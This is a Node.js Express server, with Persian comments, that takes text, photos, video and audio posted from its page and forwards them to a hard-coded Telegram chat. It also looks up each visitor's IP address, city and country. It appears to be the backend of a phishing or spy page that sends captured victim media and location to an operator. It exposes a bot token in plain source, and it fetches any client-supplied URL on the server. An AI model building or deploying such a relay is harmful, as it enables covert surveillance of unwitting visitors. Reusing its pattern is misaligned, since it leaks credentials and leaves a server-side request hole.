import express from 'express';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8401969947:AAFLWQND6J1aAHaDcZSuhhM6gkDFdinD5_8';
const CHAT_ID = '7727238041';

app.use(express.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// ارسال پیام متنی
app.post('/api/send', async (req, res) => {
  const { text } = req.body;
  if (!text) return res.json({ ok: false });

  try {
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
    });
    const j = await r.json();
    res.json(j);
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});

// ارسال عکس
app.post('/api/send-photo', async (req, res) => {
  const { photo } = req.body;
  if (!photo) return res.json({ ok: false });

  try {
    const formData = new FormData();
    const blob = await fetch(photo).then(r => r.blob());
    formData.append('photo', blob, 'photo.jpg');
    formData.append('chat_id', CHAT_ID);

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    const j = await r.json();
    res.json(j);
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});

// ارسال فیلم
app.post('/api/send-video', async (req, res) => {
  const { video } = req.body;
  if (!video) return res.json({ ok: false });

  try {
    const formData = new FormData();
    const blob = await fetch(video).then(r => r.blob());
    formData.append('video', blob, 'video.mp4');
    formData.append('chat_id', CHAT_ID);

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
      method: 'POST',
      body: formData
    });
    const j = await r.json();
    res.json(j);
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});

// ارسال صدا
app.post('/api/send-audio', async (req, res) => {
  const { audio } = req.body;
  if (!audio) return res.json({ ok: false });

  try {
    const formData = new FormData();
    const blob = await fetch(audio).then(r => r.blob());
    formData.append('audio', blob, 'audio.ogg');
    formData.append('chat_id', CHAT_ID);

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
      method: 'POST',
      body: formData
    });
    const j = await r.json();
    res.json(j);
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});

app.get('/api/geo', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() ||
      req.headers['x-real-ip'] ||
      req.socket.remoteAddress || '';

    const r = await fetch(`http://ip-api.com/json/${ip}?lang=en&fields=status,country,city,query`);
    const j = await r.json();

    res.json({
      ip: j.query || ip,
      city: j.city || '',
      country: j.country || ''
    });
  } catch (e) {
    res.json({ ip: 'خطا', city: '', country: '' });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
